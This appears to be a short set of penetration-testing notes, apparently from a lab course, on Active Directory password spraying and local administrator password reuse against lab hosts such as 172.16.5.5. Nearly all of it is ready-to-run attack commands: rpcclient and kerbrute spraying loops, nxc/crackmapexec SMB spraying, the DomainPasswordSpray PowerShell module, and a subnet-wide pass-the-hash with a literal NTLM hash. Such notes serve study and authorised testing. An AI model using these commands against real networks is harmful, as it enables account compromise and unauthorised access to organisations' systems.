- [ ] Domain Users Password Spaying
- [ ] Local Administrator Password Reuse

Domain Users Password Spaying!!!!
```sh
# rpcclient
for u in $(cat dusers.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 dusers.txt  Welcome1

# nxc | crackmapexec
nxc smb 172.16.5.5 -u dusers.txt -p Password123 | grep +

# Domain Password Spray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
Invoke-DomainPasswordSpray -Password Welcome1 -Force
```
Local Administrator Password Reuse!!!
```sh
nxc smb --local-auth 172.16.5.0/23 -u administrator -p Welcome1 | grep +

nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

